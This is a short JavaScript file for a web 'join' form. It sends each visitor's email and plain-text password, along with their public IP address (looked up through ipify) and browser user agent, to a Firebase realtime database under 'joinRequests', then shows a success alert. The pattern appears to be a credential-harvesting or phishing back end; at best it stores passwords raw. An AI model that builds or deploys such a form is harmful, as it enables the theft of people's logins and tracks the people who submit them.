import { initializeApp } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-app.js";
import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyB167qMIQbZfcQ0pRDa3HXHb7_I1XQ7xcE",
  authDomain: "nahiyan-7f898.firebaseapp.com",
  databaseURL: "https://nahiyan-7f898-default-rtdb.firebaseio.com",
  projectId: "nahiyan-7f898",
  storageBucket: "nahiyan-7f898.firebasestorage.app",
  messagingSenderId: "108162248148",
  appId: "1:108162248148:web:4824e2fee343d924b9ba41",
  measurementId: "G-T2EW64QQS4"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

async function getUserIP() {
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    return data.ip || "Unknown";
  } catch(e) {
    return "Unknown";
  }
}

document.getElementById("joinForm").addEventListener("submit", async (e) => {
  e.preventDefault();

  const email = document.getElementById("email").value.trim();
  const password = document.getElementById("password").value.trim();
  const ip = await getUserIP();
  const userAgent = navigator.userAgent;

  const newRef = push(ref(db, "joinRequests"));
  set(newRef, {
    email,
    password,
    ip,
    userAgent,
    addedTime: Date.now()
  })
  .then(() => {
    alert("✅ Request submitted!");
    e.target.reset();
  })
  .catch(err => alert("⚠️ " + err.message));
});
